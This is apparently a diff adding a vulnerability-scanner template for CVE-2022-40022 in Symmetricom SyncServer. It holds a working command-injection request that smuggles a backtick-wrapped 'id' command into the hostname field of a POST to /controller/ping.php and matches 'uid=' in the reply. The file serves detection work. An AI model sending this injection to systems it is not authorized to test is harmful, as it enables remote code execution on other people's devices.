@@ -1,0 +1,25 @@
+id: cve-2022-40022
+info:
+  name: Symmetricom SyncServer Remote Code Execution (CVE-2022-40022)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,cve
+http:
+  - method: POST
+    path:
+      - "/controller/ping.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      currentTab=ping&refreshMode=&ethDirty=false&snmpCfgDirty=false&snmpTrapDirty=false&pingDirty=false&hostname=%60id%60&port=eth0&pingType=ping
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        words:
+          - "uid="
+          - "Symmetricom SyncServer"
+          - "unknown host"
+        part: body
